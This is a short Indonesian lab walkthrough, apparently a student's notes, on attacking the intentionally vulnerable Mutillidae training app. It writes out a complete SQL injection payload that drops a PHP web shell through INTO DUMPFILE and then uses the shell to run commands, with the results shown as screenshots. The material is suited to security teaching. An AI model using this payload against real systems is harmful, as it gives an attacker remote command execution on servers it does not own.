Lesson 10
--------
- **Step 1**    : Buka mozilla pada Kali lalu buka web mutillidae lalu klik OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info pada mutillidae, lalu ubah size pada kolom **Name** dari **20** menjadi **100** lalu ketik `' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' --` dan jangan lupa tambahkan spasi setelah `--` dan klik view account details
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/1.JPG)
- Lalu akan muncul hasilnya
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/2.JPG)
- **Step 2**    : Buka tab baru pada mozilla lalu buka `10.151.36.105/mutillidae/execute_command.php` dan ini contoh-contoh untuk perintah di execute command
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/3.JPG)
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/4.JPG)
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/5.JPG)
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/6.JPG)
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/7.JPG)
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%2010/8.JPG)
